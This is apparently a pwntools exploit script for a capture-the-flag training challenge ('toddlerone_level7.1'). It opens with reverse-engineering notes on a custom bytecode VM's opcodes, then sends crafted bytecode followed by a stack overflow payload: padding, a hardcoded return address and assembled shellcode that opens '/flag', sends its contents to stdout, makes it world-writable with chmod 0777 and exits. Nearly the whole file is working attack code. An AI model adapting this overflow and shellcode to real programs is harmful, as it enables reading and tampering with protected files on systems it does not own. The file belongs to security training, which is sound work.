"""
0x401acd

imm - 0x8
add - 0x20
stk - 0x40
stm - 0x2
ldm - 0x4
cmp - 0x80
jmp - 0x10
sys - 0x01
    read 20 / 8
        b - offset
        c - size
        a - fd
    exit 10
b = 10
c = 08
i = 04
f = 02
d = 01
s = 20
a = 40

"""

from pwn import *
p = process("/challenge/toddlerone_level7.1")

a = b'\xff\x01\x01\x68\x02\x01\x00\x40\x01\x10\x20\x80'
a = b'\x08\x10\xff\x08\x08\x68\x08\x40\x00\x80\x08\x01'
a = b'\x08\xff\x10\x08\x86\x08\x08\x00\x40\x01\x10\x01\x01\x10\x10'
print(a)
print(p.readuntil(b'yancode: '))
p.send(a)
a = """	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 90
    lea rdi, [rip + file]
    mov rsi, 0x1ff
	syscall
	mov rax, 60		
    mov rdi, 99
	syscall			
file:
	.string "/flag"
"""
context.arch = "amd64"

a = asm(a)

b = b'A'*25 + b'\x68\xe3\xff\xff\xff\x7f\x00\x00' + a
# b = 'a'*104
print(b)
print(hex(len(b)))
p.send(b)
print("sent")
print(p.readall())
